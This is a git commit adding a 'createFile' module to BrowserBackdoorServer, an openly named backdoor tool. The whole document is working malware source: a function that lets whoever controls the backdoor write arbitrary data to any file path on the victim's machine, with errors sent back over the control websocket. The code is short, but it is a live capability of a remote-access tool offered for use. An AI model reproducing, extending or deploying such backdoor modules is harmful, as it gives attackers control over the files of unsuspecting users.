47a070f6e7efaa635557f27a01a67dc7ad8b809d
IMcPwn <cs@imcpwn.com>
2016-06-11 12:25:24 -0400

    Add createFile module

---
+++ server/modules/createFile.js
@@ -0,0 +1,21 @@
+// INTERACTIVE
+/*
+ * Copyright (c) 2016 IMcPwn  - http://imcpwn.com
+ * BrowserBackdoorServer by IMcPwn.
+ * See the file 'LICENSE' for copying permission
+ *
+ * Info: Creates a file
+ * Parameters: fullPath, Data in file
+ * Returns: undefined, error
+ * Author: IMcPwn
+ */
+
+if (typeof fs === typeof undefined) fs = require('fs');
+
+createFile = function (fullPath, data) {
+    fs.writeFile(fullPath, data, function(err) {
+        if (err) ws.send(err);
+    }); 
+}
+
+return "Usage: createFile(fullPath, data)";
